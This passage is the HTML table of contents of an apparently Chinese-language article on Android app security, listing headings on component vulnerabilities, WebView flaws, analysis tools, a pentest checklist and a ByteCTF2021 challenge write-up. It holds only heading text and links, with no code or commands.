toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">数据安全检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B"><span class="toc-text">敏感信息检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%AA%E8%B4%B4%E6%9D%BF%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">剪贴板敏感信息泄露风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Intent%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">Intent敏感数据泄露风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PendingIntent%E8%AF%AF%E7%94%A8%E9%A3%8E%E9%99%A9"><span class="toc-text">PendingIntent误用风险</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">密钥硬编码风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%88%96%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%9F%A5"><span class="toc-text">数据或程序加载检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BASE64%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">BASE64安全检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%85%A8%E5%B1%80%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">文件全局读写漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">日志泄露风险检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%8A%A0%E8%BD%BDdex%E6%A3%80%E6%B5%8B"><span class="toc-text">外部加载dex检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B"><span class="toc-text">外部存储路径检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E9%A3%8E%E9%99%A9"><span class="toc-text">明文数字证书风险</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">敏感函数调用检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0%E6%A3%80%E6%B5%8B"><span class="toc-text">安全相关的函数检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB%E6%A3%80%E6%B5%8B"><span class="toc-text">安全相关的类检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B"><span class="toc-text">运行命令检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Native-Library%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B"><span class="toc-text">Native Library加载检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex%E6%A3%80%E6%B5%8B"><span class="toc-text">外部动态加载dex检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">root代码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96IMEI-%E5%92%8CDevice-ID%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">获取IMEI 和Device ID敏感信息代码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Android-ID%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">获取Android ID敏感信息代码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81SMS%E6%95%8F%E6%84%9F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">发送SMS敏感代码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">文件删除代码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signature%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">signature代码检测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">系统漏洞检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APP一些漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Activity%E7%BB%84%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Activity组件的相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="toc-text">Activity漏洞原理分析和复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%BB%95%E8%BF%87"><span class="toc-text">越权绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%AC%BA%E8%AF%88-Activity%E5%8A%AB%E6%8C%81"><span class="toc-text">钓鱼欺诈&#x2F;Activity劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E7%A7%81%E5%90%AF%E5%8A%A8Intent%E5%8C%85%E5%90%AB%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="toc-text">隐私启动Intent包含敏感数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-text">拒绝服务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android%E5%A4%96%E9%83%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">Android外部程序的调用方法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Service组件相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-text">service基本介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E5%90%AF%E5%8A%A8"><span class="toc-text">service启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bindService%E5%90%AF%E5%8A%A8"><span class="toc-text">bindService启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Service%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">Service漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#service%E5%8A%AB%E6%8C%81"><span class="toc-text">service劫持</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0"><span class="toc-text">消息伪造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E6%8E%A5%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-text">拒接服务攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Service%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">Service的安全防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BroadcastReceiver%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">BroadcastReceiver相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B9%BF%E6%92%AD%E6%8E%A5%E6%94%B6%E8%80%85BroadcastReceiver"><span class="toc-text">自定义广播接收者BroadcastReceiver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E6%92%AD%E6%8E%A5%E6%94%B6%E8%80%85%E6%B3%A8%E5%86%8C"><span class="toc-text">广播接收者注册</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E6%92%AD%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">广播的类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E5%B9%BF%E6%92%AD"><span class="toc-text">普通广播</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%B9%BF%E6%92%AD%EF%BC%9A"><span class="toc-text">系统广播：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%BA%8F%E5%B9%BF%E6%92%AD"><span class="toc-text">有序广播</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%B9%BF%E6%92%AD"><span class="toc-text">本地广播</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BroadcastReceiver%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">BroadcastReceiver漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">敏感信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-text">权限绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0-2"><span class="toc-text">消息伪造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-text">拒绝服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">安全防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Provider%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Content Provider组件相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uri%E4%BB%8B%E7%BB%8D"><span class="toc-text">uri介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URI%E8%A7%A3%E6%9E%90"><span class="toc-text">URI解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContentProvider%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE"><span class="toc-text">ContentProvider操作数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96"><span class="toc-text">监听数据变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Content-Provider%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">Content Provider漏洞原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQL注入漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">目录遍历漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webview%E6%BC%8F%E6%B4%9E"><span class="toc-text">Webview漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebView%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">WebView基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5"><span class="toc-text">打开网页</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81"><span class="toc-text">远程加载、</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B1%BB%E4%BD%BF%E7%94%A8"><span class="toc-text">常用类使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WebSettings"><span class="toc-text">WebSettings</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WebViewClient%E7%B1%BB"><span class="toc-text">WebViewClient类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webview%E4%B8%8Ejs%E5%8A%A0%E6%8A%A4"><span class="toc-text">webview与js加护</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android%E8%B0%83%E7%94%A8JS"><span class="toc-text">Android调用JS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webview%E6%BC%8F%E6%B4%9E-2"><span class="toc-text">Webview漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%A6%82%E6%8B%AC"><span class="toc-text">漏洞类型概括</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Webview%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">Webview任意代码执行漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#webview%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">webview明文存储漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E"><span class="toc-text">跨域漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96-%E5%BA%94%E7%94%A8%E5%85%8B%E9%9A%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">任意文件窃取(应用克隆漏洞)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E-%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">通用协议漏洞(恶意页面注入)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-2"><span class="toc-text">安全防护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB"><span class="toc-text">符号链接跨源攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-3"><span class="toc-text">安全防护</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93cookie"><span class="toc-text">污染cookie</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">URL配置漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-text">URL绕过漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hearachical-Uri%E7%BB%95%E8%BF%87"><span class="toc-text">hearachical Uri绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#URL-Scheme%E7%BB%95%E8%BF%87"><span class="toc-text">URL Scheme绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">服务器跳转漏洞绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-text">file协议绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Intent-WebView"><span class="toc-text">Intent + WebView</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Intent%E8%AE%BF%E9%97%AE%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%95%8C%E9%9D%A2%E5%92%8C%E7%AA%83%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">Intent访问导出组件加载恶意界面和窃取信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Intent%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%BC%E8%87%B4launchAnyWhere%E6%BC%8F%E6%B4%9E"><span class="toc-text">Intent重定向导致launchAnyWhere漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Deeplink-WebView%E6%BC%8F%E6%B4%9E"><span class="toc-text">Deeplink + WebView漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">任意代码执行漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xss%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">xss注入漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DeepLinks%E5%9C%A8WebView%E4%B8%8A%E7%9A%84%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E"><span class="toc-text">DeepLinks在WebView上的组合漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#loadDataWithBaseURL%E6%BC%8F%E6%B4%9E"><span class="toc-text">loadDataWithBaseURL漏洞</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">安全分析工具安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#drozer"><span class="toc-text">drozer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MobSF"><span class="toc-text">MobSF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APP渗透测试要点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8"><span class="toc-text">客户端程序安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8C%85%E7%AD%BE%E5%90%8D"><span class="toc-text">安装包签名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BF%9D%E6%8A%A4"><span class="toc-text">反编译保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C"><span class="toc-text">应用完整性校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-text">组件安全</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8"><span class="toc-text">敏感信息安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%96%87%E4%BB%B6"><span class="toc-text">数据文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logcat%E6%97%A5%E5%BF%97"><span class="toc-text">Logcat日志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">密码安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E5%8A%AB%E6%8C%81"><span class="toc-text">键盘劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%B8%83%E5%B1%80%E8%BD%AF%E9%94%AE%E7%9B%98"><span class="toc-text">随机布局软键盘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E5%BD%95%E5%83%8F"><span class="toc-text">屏幕录像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%BF%E5%AF%86%E7%A0%81"><span class="toc-text">手势密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-text">安全策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%A3%80%E6%B5%8B"><span class="toc-text">密码复杂度检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95%E9%99%90%E5%88%B6"><span class="toc-text">账号登录限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A%E7%AD%96%E7%95%A5"><span class="toc-text">账户锁定策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E9%AA%8C%E8%AF%81"><span class="toc-text">问题验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8"><span class="toc-text">会话安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2%E5%88%87%E6%8D%A2%E4%BF%9D%E6%8A%A4"><span class="toc-text">界面切换保护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UI%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">UI信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">验证码安全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%80%80%E5%87%BA"><span class="toc-text">安全退出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%AA%8C%E8%AF%81"><span class="toc-text">密码修改验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity-%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81"><span class="toc-text">Activity 界面劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4"><span class="toc-text">进程保护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%92%8C%E4%BF%AE%E6%94%B9"><span class="toc-text">内存访问和修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-text">动态注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8"><span class="toc-text">通信安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%81%E4%B9%A6%E6%9C%89%E6%95%88%E6%80%A7"><span class="toc-text">证书有效性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%92%8C%E6%A0%A1%E6%A3%80"><span class="toc-text">关键数据加密和校检</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-text">访问控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9B%B4%E6%96%B0%E5%AE%89%E5%85%A8%E6%80%A7"><span class="toc-text">客户端更新安全性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E4%BF%A1%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-text">短信重放攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8"><span class="toc-text">业务安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-text">越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E6%98%93%E7%AF%A1%E6%94%B9"><span class="toc-text">交易篡改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-text">重放攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">用户枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-XSS-CSRF"><span class="toc-text">注入&#x2F;XSS&#x2F;CSRF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">漏洞的一些分析 ByteCTF2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BabyDroid"><span class="toc-text">BabyDroid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apk%E5%88%86%E6%9E%90"><span class="toc-text">apk分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 